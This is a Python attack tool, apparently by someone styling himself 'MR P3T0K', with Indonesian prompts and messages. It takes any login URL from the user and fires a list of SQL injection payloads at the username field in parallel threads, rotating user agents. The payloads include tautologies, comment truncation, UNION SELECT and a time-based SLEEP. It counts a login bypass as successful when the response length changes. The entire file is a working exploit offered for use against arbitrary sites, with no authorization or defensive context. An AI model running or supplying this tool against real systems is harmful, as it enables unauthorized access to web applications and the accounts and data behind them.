import requests
import threading
import random
import os
from colorama import Fore, Style, init

init(autoreset=True)

def banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(Fore.GREEN + "=" * 50)
    print(Fore.CYAN + "  ____                             ")
    print(Fore.CYAN + " | __ ) _   _ _ __   __ _ ___ ___  ")
    print(Fore.CYAN + " |  _ \| | | | '_ \ / _` / __/ __| ")
    print(Fore.CYAN + " | |_) | |_| | |_) | (_| \__ \__ \ ")
    print(Fore.CYAN + " |____/ \__, | .__/ \__,_|___/___/ ")
    print(Fore.CYAN + "        |___/|_|                   ")  
    print(Fore.RED + "       MR P3T0K - SQL Injection Login Bypass")
    print(Fore.GREEN + "=" * 50 + "\n")

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 10)",
]

payloads = [
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR 1=1 --",
    "' OR 1=1 #",
    "' OR 'a'='a' --",
    "admin' --",
    "' UNION SELECT 1,2,3 --",
    "' AND '1'='1",
    "' OR IF(1=1, SLEEP(5), 0) --"
]

def test_sqli(url, payload):
    headers = {"User-Agent": random.choice(user_agents)}
    data = {"username": payload, "password": "test"}
    
    try:
        response = requests.post(url, data=data, headers=headers, timeout=5)
        if len(response.text) != baseline_length:
            print(Fore.GREEN + f"[+] Bypass berhasil dengan payload: {payload}")
            return True
        else:
            print(Fore.RED + f"[-] Gagal dengan payload: {payload}")
    except requests.exceptions.RequestException:
        print(Fore.RED + "[!] Error: Tidak bisa terhubung ke server")
    return False

if __name__ == "__main__":
    banner()
    
    url = input(Fore.CYAN + "Masukkan URL Login (contoh: http://target.com/login.php): ")

    if not url.startswith("http"):
        print(Fore.RED + "[!] URL tidak valid! Pastikan menggunakan format http:// atau https://")
        exit()

    print(Fore.YELLOW + "[*] Menghitung panjang respons default...")
    try:
        baseline_response = requests.post(url, data={"username": "random", "password": "random"})
        baseline_length = len(baseline_response.text)
        print(Fore.GREEN + f"[+] Panjang respons normal: {baseline_length}")
    except requests.exceptions.RequestException:
        print(Fore.RED + "[!] Error: Tidak bisa terhubung ke server!")
        exit()

    print(Fore.YELLOW + "[*] Menjalankan SQL Injection test...")
    
    threads = []
    for payload in payloads:
        t = threading.Thread(target=test_sqli, args=(url, payload))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print(Fore.CYAN + "[+] Tes selesai! Jika ada payload yang berhasil, silakan cek hasilnya.")
